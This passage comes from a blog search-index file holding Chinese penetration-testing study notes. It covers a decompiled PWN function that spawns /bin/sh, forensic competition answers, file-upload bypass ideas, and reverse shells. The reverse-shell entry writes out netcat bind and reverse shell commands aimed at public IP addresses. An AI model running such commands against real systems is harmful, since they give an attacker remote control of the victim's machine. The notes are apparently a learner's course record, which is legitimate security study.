__int64类型的变量v2  v2 = __readfsqword(0x28u); // 从FS段寄存器的偏移量0x28处读取一个64位的值，并赋值给v2。这通常用于实现堆栈保护  argv[0] = "/bin/sh"; // 将argv数组的第一个元素设为"/bin/sh"，这是要执行的程序的路径  argv[1] = 0LL; // 将argv数组的第二个元素设为0，表示参数列表结束  argv[2] = 0LL; // 将argv数组的第三个元素设为0，表示参数列表结束  execve("/bin/sh", argv, 0LL); // 调用execve函数，执行"/bin/sh"程序。argv是参数列表，0LL表示环境变量列表为空  return __readfsqword(0x28u) ^ v2; // 从FS段寄存器的偏移量0x28处再次读取一个64位的值，并与v2进行异或操作。如果结果为0，表示在函数执行过程中，堆栈没有被破坏}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数的主要逻辑是执行一个新的程序（bin/sh），并检查在执行过程中堆栈是否被破坏。如果堆栈被破坏，函数返回的值将不为0</p>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机基础</title>
      <link href="/du-yu/pwn-begain-study01.html"/>
      <url>/du-yu/pwn-begain-study01.html</url>
      
        <content type="html"><![CDATA[<h1 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a><strong>计算机基础</strong></h1><h2 id="一、操作系统"><a href="#一、操作系统" class="headerlink" title="一、操作系统"></a>一、操作系统</h2><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-1.jpg" alt="001-1" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-2.jpg" alt="001-2" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-3.jpg" alt="001-3" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-4.jpg" alt="001-4" style="zoom: 50%;"><h3 id="1、程序运行只在乎和编辑虚拟地址"><a href="#1、程序运行只在乎和编辑虚拟地址" class="headerlink" title="1、程序运行只在乎和编辑虚拟地址"></a>1、程序运行只在乎和编辑虚拟地址</h3><p>虚拟地址是由CPU和操作系统共同提供的一种内存管理技术。在现代计算机系统中，<strong>每个运行的程序都认为自己独占了所有的内存</strong>，<strong>这些内存地址就是虚拟地址</strong>。实际上，这些虚拟地址是由操作系统通过内存管理单元（MMU）映射到物理内存地址的。</p><h2 id="2、思考"><a href="#2、思考" class="headerlink" title="2、思考:"></a>2、思考:</h2><p> 在一个内存为256M的计算机上:执行程序A(需要内存10M),程序A连续计算并输出所得的质数。同时执行程序B(需要内存5M)，B程序从a.txt读入130MB数据，从b.xt读入50MB数据,数据合并后,存入c.txt. CPU是加何运作的? </p><ol><li><h3 id="程序加载："><a href="#程序加载：" class="headerlink" title="程序加载："></a><strong>程序加载</strong>：</h3><p>首先，操作系统会将程序A和程序B加载到内存中。由于程序A需要10MB内存，程序B需要5MB内存，总共需要15MB内存，这在256MB的内存中是完全可以容纳的。</p></li><li><h3 id="CPU调度："><a href="#CPU调度：" class="headerlink" title="CPU调度："></a><strong>CPU调度</strong>：</h3><p>操作系统会使用一种叫做进程调度的技术，将CPU的时间分配给程序A和程序B。例如，它可能先让程序A运行一段时间，然后再让程序B运行一段时间，如此反复，使得两个程序看起来像是在同时运行。</p></li><li><h3 id="虚拟内存和磁盘I-x2F-O："><a href="#虚拟内存和磁盘I-x2F-O：" class="headerlink" title="虚拟内存和磁盘I/O："></a><strong>虚拟内存和磁盘I/O</strong>：</h3><p>对于程序B，它需要读取的数据总量（130MB + 50MB）超过了物理内存的大小（256MB）。在这种情况下，操作系统会使用一种叫做虚拟内存的技术，将部分数据暂时存储在硬盘上，然后在需要的时候将这些数据加载到内存中。这种技术叫做页面交换（Page Swapping）或者换页（Paging）。同时，操作系统会使用缓冲技术，将读取和写入的数据暂时存储在内存中，然后在合适的时候再进行实际的磁盘I/O操作。</p></li><li><h3 id="数据合并和存储："><a href="#数据合并和存储：" class="headerlink" title="数据合并和存储："></a><strong>数据合并和存储</strong>：</h3><p>程序B在读取完所有数据并进行合并后，会将结果写入c.txt文件。这个过程可能会涉及到磁盘I/O操作，操作系统会负责管理这些操作。</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CPU和操作系统会共同工作，通过进程调度、虚拟内存、磁盘I/O等技术，使得程序A和程序B可以在有限的内存和CPU资源中同时运行，并完成各自的任务。</p>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门课程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电子取证红包赛</title>
      <link href="/du-yu/cppu-electronic-forensics-01.html"/>
      <url>/du-yu/cppu-electronic-forensics-01.html</url>
      
        <content type="html"><![CDATA[<p>每日吐槽：蛙趣啊！~   该说不说，取证大师真的很强，但是也确实搞心态啊，取证三次，电脑崩掉2次，天选三太废物了啊~</p><p>1、cd082d248033cd557b42b5faa0de5b9f</p><p>(MD5: cd082d248033cd557b42b5faa0de5b9f<br>SHA1: b4b1c4145c599e7d232c3611317ed076495dafb9<br>SHA256: 78295b0b7a71c7dd7555cb2db923de6f78f5338a6aae9150a34fecd535487360<br>CRC32: b7ee2645)</p><p>2、6.1</p><p>3、2020-09-23 14:24:54</p><p>4、A</p><p>5、192.168.152.128</p><p>6、(UTC+08:00)</p><p>7、 ceabb038fdc3e2e55c1e78ad0a2e5fb9</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702160238449.png" alt="image-20230702160238449" style="zoom:25%;"><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702160401497.png" alt="image-20230702160401497" style="zoom:25%;"><p>8、6191e971cfdf5296ee7df7c2fed56377</p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702162304311.png" alt="image-20230702162304311"></p><p>9、HackBar V2   、    Proxy SwitchyOmega</p><p>（差点被LZJ骗了，这个就是对的）</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702154910574.png" alt="image-20230702154910574" style="zoom:25%;"><p>10、7.2.</p><img src="C:\Users\asus\Pictures\Screenshots\Snipaste_2023-07-02_15-41-43.png" alt="Snipaste_2023-07-02_15-41-43" style="zoom:25%;"><p>11、192.168.152.150</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702180300769.png" alt="image-20230702180300769" style="zoom:25%;"><p>12、00-0C-29-0F-B9-F7</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702163500129.png" alt="image-20230702163500129" style="zoom:25%;"><p>13、CaiXX-PC</p><p>14、pico2020</p><p>15、105,906,176</p><p>16、A</p><p>17、B</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702182224126.png" alt="image-20230702182224126" style="zoom:25%;"><p>18、12753</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193248514.png" alt="image-20230702193248514" style="zoom:25%;"><p>19、 8f8319bc3c1b8ed92aa5498dd98c8e87e5f888f7<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193115519.png" alt="image-20230702193115519" style="zoom:25%;"></p><p>20、Administrator   、    Guest 、  chaunchaun</p><p>22、shuandan</p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193916532.png" alt="image-20230702193916532"></p><p>23、<a href="http://www.tpshop.com.tar.gz/">www.tpshop.com.tar.gz</a></p><p>24、120ac49800671dc383b6f3709c25c099</p><p>两都是一样，所以是同一个webshell<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702195054106.png" alt="image-20230702195054106"></p><p>25、 tpshop / s13132312s<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702195519596.png" alt="image-20230702195519596" style="zoom:25%;"></p><p>27、26</p><p>31、9176</p><p>37、101</p><p>（一个一个数）</p><p>38、B</p>]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证校赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>050文件上传漏洞</title>
      <link href="/du-yu/vulnerability-learning-02.html"/>
      <url>/du-yu/vulnerability-learning-02.html</url>
      
        <content type="html"><![CDATA[<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>上传图片—–&gt;base64数据（文件上传变为数据形式 ，方便存储在数据库中）</p><p>显示图片—–&gt;解码数据还原，如果不是图片则不显示</p><p>（可能有特殊符号各种什么的，转化为数据进行完整封装）</p><p>解析协议固定</p><p>不管是什么文件类型</p><p>解析为指定数据类型</p><p>数据存储文件，固定的协议解析文件</p><p>不管上传什么文件，只认数据</p><h3 id="大网站分站存储"><a href="#大网站分站存储" class="headerlink" title="大网站分站存储"></a>大网站分站存储</h3><p>保护域名——————–&gt;控制解析</p><p>想测试ZZ</p><p>OSS存储</p><p>如何判断：<strong>1.看上传之后的访问地址，如果后门无法解析就</strong></p><p><strong>2.看上传的数据包（bilibili）</strong></p><p><strong>3.分站上传看访问地址</strong></p><p><strong>4.一打开就是下载</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/Vulnerability-learning.png" alt="Vulnerability-learning"></p><h1 id="绕过（除了下面这种其他无解）"><a href="#绕过（除了下面这种其他无解）" class="headerlink" title="绕过（除了下面这种其他无解）"></a>绕过（除了下面这种其他无解）</h1><p>文件被锁</p><p>能控制上传文件写入目录</p><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><p>上传以后就被杀掉了</p><h1 id="SDK阿里云"><a href="#SDK阿里云" class="headerlink" title="SDK阿里云"></a>SDK阿里云</h1>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-漏洞学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>049挖洞思路</title>
      <link href="/du-yu/vulnerability-learning-01.html"/>
      <url>/du-yu/vulnerability-learning-01.html</url>
      
        <content type="html"><![CDATA[<h2 id="PHP中间件"><a href="#PHP中间件" class="headerlink" title="PHP中间件"></a>PHP中间件</h2><p>形成：网上找的中间件</p><h3 id="编译器漏洞"><a href="#编译器漏洞" class="headerlink" title="编译器漏洞"></a>编译器漏洞</h3><p>编译器（文件上传文件解析）</p><p>形成原因：代码逻辑存在安全问题（可能是从网上找的代码）</p><p>扫描目录，看ue版本，利用漏洞</p><h2 id="CMS源码"><a href="#CMS源码" class="headerlink" title="CMS源码"></a>CMS源码</h2><p>知道网站程序</p><p>已知漏洞，直接放到漏洞检测工具 </p><h2 id="原生态"><a href="#原生态" class="headerlink" title="原生态"></a>原生态</h2><p>对目标一无所知</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>审计自己写的和抄袭的</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-漏洞学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>06抓包技术&amp;HTTPS协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB&amp;转发联动</title>
      <link href="/du-yu/information-collection-06.html"/>
      <url>/du-yu/information-collection-06.html</url>
      
        <content type="html"><![CDATA[<h3 id="web协议的抓包"><a href="#web协议的抓包" class="headerlink" title="web协议的抓包"></a>web协议的抓包</h3><p>工具：charles（茶杯）  Telerik Fiddler</p><p>BP设置代理的原理：感觉像充当一个VPN，让浏览器走监听的端口，BP监听或者拦截</p><p><strong>本机</strong>：证书——&gt;抓包</p><p><strong>模拟器</strong>：证书—–&gt;设置代理——&gt;抓包（封装和没封装的APP都能抓到）</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p>、<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-07%20085010.png" alt="屏幕截图 2023-06-07 085010"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>05基础命令&amp;反弹shell&amp;数据不回显带外查询</title>
      <link href="/du-yu/information-collection-05.html"/>
      <url>/du-yu/information-collection-05.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、常规基本渗透命令详解"><a href="#一、常规基本渗透命令详解" class="headerlink" title="一、常规基本渗透命令详解"></a>一、常规基本渗透命令详解</h2><p>(<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a>)</p><h4 id="实用案例1：文件上传下载-解决无图形化-amp-解决数据传输"><a href="#实用案例1：文件上传下载-解决无图形化-amp-解决数据传输" class="headerlink" title="实用案例1：文件上传下载-解决无图形化&amp;解决数据传输"></a>实用案例1：文件上传下载-解决无图形化&amp;解决数据传输</h4><p> 解决问题：不能正常在目标靶机下载后门，将文件上传到web服务器，在目标靶机用棱角社区生成的命令下载到目标靶机上</p><p>棱角社区：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><h2 id="二、反弹S-hell命令-解决数据回显-amp-解决数据通讯"><a href="#二、反弹S-hell命令-解决数据回显-amp-解决数据通讯" class="headerlink" title="二、反弹S hell命令-解决数据回显&amp;解决数据通讯"></a>二、反弹S hell命令-解决数据回显&amp;解决数据通讯</h2><p>常规的shell连接，攻击者的系统会连接到受害者的系统。但在反弹shell中，情况正好相反，是受害者的系统连接到攻击者的系统。好处：可以绕过防火墙和其他安全措施，因为大多数防火墙都是配置为阻止入站连接，而不是出站连接。</p><p>前提：需要攻击者能够在受害者的系统上<strong>执行代码</strong>，这通常需要利用某种漏洞，或者通过社会工程学的手段诱骗受害者执行恶意代码。此外，一旦建立了反弹shell，攻击者需要保持其系统在线，并监听来自受害者系统的连接。如果攻击者的系统离线，或者不再监听，那么反弹shell就会失效。</p><p>命令生成：<a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p><p><strong>实例</strong>：</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606173654309.png" alt="image-20230606173654309"></p><h2 id="三、正反向代理"><a href="#三、正反向代理" class="headerlink" title="三、正反向代理"></a>三、正反向代理</h2><h4 id="原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接"><a href="#原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接" class="headerlink" title="原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接"></a>原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接</h4><p>1、正向连接：本地监听等待对方连接</p><p>Linux控制Windows</p><p>//绑定CMD到本地5566端口</p><p>nc -e cmd -lvp 5566</p><p>//主动连接目标5566</p><p>ncat 47.122.23.131 5566</p><p>Windows控制Linux</p><p>//绑定SH到本地5566端口</p><p>ncat -e /bin/sh -lvp 5566</p><p>//主动连接目标5566</p><p>nc 47.94.236.117 5566</p><p>2、反向连接：主动给出去，对方监听</p><p>//绑定CMD到目标5566端口</p><p>ncat -e /bin/sh 47.122.23.131 5566</p><p>//等待5566连接</p><p>nc -lvvp 5566</p><p>//绑定CMD到目标5566端口</p><p>nc -e cmd 47.94.236.117 5566</p><p>//等待5566连接</p><p>ncat -lvvp 5566</p><h2 id="四、内网服务器"><a href="#四、内网服务器" class="headerlink" title="四、内网服务器"></a>四、内网服务器</h2><p>只有内网IP主动出去找主机IP（唯一）才行</p><p>在内网的路由器上设置一个<strong>端口转发</strong>（端口隐私），可以和内网的目标IP交互 </p><p><strong>两边都是内网</strong>，需要一个中间人</p><h2 id="五、数据回显-查询带外-amp-网络协议层级"><a href="#五、数据回显-查询带外-amp-网络协议层级" class="headerlink" title="五、数据回显-查询带外&amp;网络协议层级"></a>五、数据回显-查询带外&amp;网络协议层级</h2><p><strong>实例：</strong>防火墙组合数据不回显-ICMP带外查询Dnslog</p><p>漏洞有，数据无法回显：（原因：回显源代码被注释掉了或者直接没有）</p><p>解决：1.反弹shell </p><p>​          2.带外查询</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606184614766.png" alt="image-20230606184614766"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606185106252.png" alt="image-20230606185106252"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606185235140.png" alt="image-20230606185235140"></p><h2 id="带外查询："><a href="#带外查询：" class="headerlink" title="带外查询："></a>带外查询：</h2><p>演示中防火墙都开着，ping命令能绕过防火墙（大部分时候），<code>ping</code>命令使用的是ICMP协议（Internet Control Message Protocol），防火墙过滤的是TCP和UDP协议，比ICMP协议低一级</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606202146536.png" alt="image-20230606202146536"></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606225717092.png" alt="image-20230606225717092"></h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606230834445.png" alt="image-20230606230834445"></p><h2 id="六、防火墙出入站设置"><a href="#六、防火墙出入站设置" class="headerlink" title="六、防火墙出入站设置"></a>六、防火墙出入站设置</h2><p>入站设置：检查入站流量，只能<strong>反向连接</strong>，主动给出</p><p>出站设置：检查出站流量，<strong>正向连接</strong>（但是入站也会默认开启较严格的设置）</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p> <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230607084906805.png" alt="image-20230607084906805"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>04APP架构-封装&amp;原生态&amp;H5&amp;flutter</title>
      <link href="/du-yu/information-collection-04.html"/>
      <url>/du-yu/information-collection-04.html</url>
      
        <content type="html"><![CDATA[<h2 id="APP应用开发架构"><a href="#APP应用开发架构" class="headerlink" title="APP应用开发架构"></a>APP应用开发架构</h2><h3 id="1、原生开发"><a href="#1、原生开发" class="headerlink" title="1、原生开发"></a>1、原生开发</h3><p>安卓一般使用java语言开发，当然现在也有kotlin语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p><p>APP-开发架构-原生态-IDEA</p><h4 id="安全影响：反编译-amp-抓包-amp-常规测试（提取资产信息：1-接口：IP地址、网站域名）"><a href="#安全影响：反编译-amp-抓包-amp-常规测试（提取资产信息：1-接口：IP地址、网站域名）" class="headerlink" title="安全影响：反编译&amp;抓包&amp;常规测试（提取资产信息：1.接口：IP地址、网站域名）"></a>安全影响：反编译&amp;抓包&amp;常规测试（提取资产信息：1.接口：IP地址、网站域名）</h4><h4 id="安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包"><a href="#安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包" class="headerlink" title="安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包"></a>安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包</h4><h3 id="2、使用H5语言开发（前端语言）"><a href="#2、使用H5语言开发（前端语言）" class="headerlink" title="2、使用H5语言开发（前端语言）"></a>2、使用H5语言开发（前端语言）</h3><p>使用H5开发的好处有很多，可多端复用，比如浏览器端，ios端，当然H5开发的体验是没有原生好的。结合我做过的项目来说，一般是这个页面需要分享出去的话，就用H5开发。</p><h4 id="APP-开发架构-H5-amp-Vue-HBuilderX"><a href="#APP-开发架构-H5-amp-Vue-HBuilderX" class="headerlink" title="APP-开发架构-H5&amp;Vue-HBuilderX"></a>APP-开发架构-H5&amp;Vue-HBuilderX</h4><p>演示：HBuilderX案例</p><p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p><h4 id="WX小程序-开发架构-H5-amp-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-amp-Vue-HBuilderX" class="headerlink" title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h4><p>演示：HBuilderX案例</p><p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p><h3 id="3、使用flutter开发"><a href="#3、使用flutter开发" class="headerlink" title="3、使用flutter开发"></a>3、使用flutter开发</h3><p>flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。</p><h3 id="4、常规Web开发"><a href="#4、常规Web开发" class="headerlink" title="4、常规Web开发"></a>4、常规Web开发</h3><p>Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。</p><h4 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h4><p>演示：ShopXO源码程序+一门APP打包</p><p>安全影响：常Web安全测试</p><h4 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h4><p>演示：ShopXO源码程序+一门APP打包</p><p>安全影响：常规Web安全测试j</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-05%20012642.png" alt="屏幕截图 2023-06-05 012642"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>03Web拓展-CDN&amp;WAF&amp;OSS&amp;反向&amp;负载均衡</title>
      <link href="/du-yu/information-collection-03.html"/>
      <url>/du-yu/information-collection-03.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、WAF-：web-Application-firewall"><a href="#一、WAF-：web-Application-firewall" class="headerlink" title="一、WAF ：web Application firewall"></a>一、WAF ：web Application firewall</h2><p>原理：web应用防火墙，保护web</p><p>影响：安全测试手法被拦截</p><p>很难绕过</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195810154.png" alt="image-20230604195810154"></p><p>、<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195848213.png" alt="image-20230604195848213"></p><h2 id="二、CDN（Content-Delivery-Network-）"><a href="#二、CDN（Content-Delivery-Network-）" class="headerlink" title="二、CDN（Content Delivery Network ）"></a>二、CDN（Content Delivery Network ）</h2><p>开通后全国分布有节点，超级ping能查到ping通的IP地址</p><p>原理：内容分发服务，旨在提高访问速度 </p><p>影响：隐藏真实源IP，导致对目标测试错误，看到的是节点</p><p>演示：阿里云备案域名全局CDN加速服务</p><p>Windows2012 + BT宝塔面板 + CDN服务</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195914239.png" alt="image-20230604195914239"></p><h2 id="三、OSS（Object-Storage-Service）"><a href="#三、OSS（Object-Storage-Service）" class="headerlink" title="三、OSS（Object Storage Service）"></a>三、OSS（Object Storage Service）</h2><p>云存储服务，旨在提高访问速度</p><p>阿里云OSS:</p><p>开OSS</p><p>2、新建Bucket</p><p>3、配置Bucket属性</p><p>4、配置Access访问</p><p>原理：</p><p>为什么要使用第三方存储？</p><p>1）静态文件会占用大量带宽</p><p>2）加载速度</p><p>3）存储空间</p><p>影响：</p><p>上传的文件或解析的文件均来自于OSS资源，无法解析，单独存储</p><p>1、修复上传安全</p><p>2、文件解析不一样</p><p>3、但Accesskey隐患</p><h2 id="四、反向代理"><a href="#四、反向代理" class="headerlink" title="四、反向代理"></a>四、反向代理</h2><h3 id="1、正向代理，挂VPN一个意思"><a href="#1、正向代理，挂VPN一个意思" class="headerlink" title="1、正向代理，挂VPN一个意思"></a>1、正向代理，挂VPN一个意思</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195939721.png" alt="image-20230604195939721"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604200708819.png" alt="image-20230604200708819"></p><h3 id="2、反向代理"><a href="#2、反向代理" class="headerlink" title="2、反向代理"></a>2、反向代理</h3><h4 id="将真实的目标指向任意一个站点"><a href="#将真实的目标指向任意一个站点" class="headerlink" title="将真实的目标指向任意一个站点"></a>将真实的目标指向任意一个站点</h4><p>主机只能访问服务器1，服务器2将数据放到服务器1，主机间接访问服务器2 </p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230604200708819.png" alt="image-20230604200708819"></p><h4 id="如果设置了反向代理，比如反向代理设置为baidu-com-x2F"><a href="#如果设置了反向代理，比如反向代理设置为baidu-com-x2F" class="headerlink" title="如果设置了反向代理，比如反向代理设置为baidu.com/"></a>如果设置了反向代理，比如反向代理设置为baidu.com/</h4><h4 id="那么你访问设置了反向代理的网站，就会直接跳转到baidu-com-x2F"><a href="#那么你访问设置了反向代理的网站，就会直接跳转到baidu-com-x2F" class="headerlink" title="那么你访问设置了反向代理的网站，就会直接跳转到baidu.com/"></a>那么你访问设置了反向代理的网站，就会直接跳转到baidu.com/</h4><h2 id="五、负载均衡"><a href="#五、负载均衡" class="headerlink" title="五、负载均衡"></a>五、负载均衡</h2><p>原理：分摊到多个操作单元上进行执行，共同完成工作任务</p><p>影响：有多个服务器加载服务，  测试过程中存在多个目标情况</p><p>演示：Nginx负载均衡配置</p><p>Windows2012 + BT宝塔面板 + Nginx</p><h4 id="定义负载设置（和ISCC实战poc-exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）"><a href="#定义负载设置（和ISCC实战poc-exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）" class="headerlink" title="定义负载设置（和ISCC实战poc.exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）"></a>定义负载设置（和ISCC实战poc.exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604204133704.png" alt="image-20230604204133704"></p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20204854.png" alt="屏幕截图 2023-06-04 204854"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>02Web其他-前后端&amp;软件&amp;Docker&amp;分配站</title>
      <link href="/du-yu/information-collection-02.html"/>
      <url>/du-yu/information-collection-02.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、-前后端分离"><a href="#一、-前后端分离" class="headerlink" title="一、 前后端分离"></a>一、 前后端分离</h2><h3 id="源码不同，前端源码和后端源码分离"><a href="#源码不同，前端源码和后端源码分离" class="headerlink" title="源码不同，前端源码和后端源码分离"></a>源码不同，前端源码和后端源码分离</h3><p>安全速度快，但大量数据传输不如传统网站</p><p>开发的框架，API传输数据</p><p>前端页面通过api接口传到后端，后台单独管理（类似于两个网站 ） </p><h3 id="1-前台只负责呈现（so基本没有漏洞）"><a href="#1-前台只负责呈现（so基本没有漏洞）" class="headerlink" title="1.前台只负责呈现（so基本没有漏洞）"></a>1.前台只负责呈现（so基本没有漏洞）</h3><p>js网站传输几乎都是API，基本不会有代码的逻辑性，页面光秃秃 </p><h3 id="2-后台更新影响前台"><a href="#2-后台更新影响前台" class="headerlink" title="2.后台更新影响前台"></a>2.后台更新影响前台</h3><p>后台域名大部分不在前端同域名中（so获取前端权限有可能不会影响后端） 能连接才能影响数据</p><p>扫描的时候找后端域名，如果找不到，查看前端框架有无历史漏洞，如果没有，只能尝试社工或者其他方法了</p><h2 id="二、宝塔-phpstudy（软件搭建的网站）"><a href="#二、宝塔-phpstudy（软件搭建的网站）" class="headerlink" title="二、宝塔+phpstudy（软件搭建的网站）"></a>二、宝塔+phpstudy（软件搭建的网站）</h2><p>(购买阿里云服务器，打开所有安全组，255端口要申请) </p><p>用不同软件搭建网站时，要关闭当前的网站</p><p>一个服务器只能支持一个软件搭建网站，端口会冲突</p><p>所需数据库，中间件不一样的话，也要关</p><p>###1.原理：打包类集成化环境，权限配置或受控制</p><h3 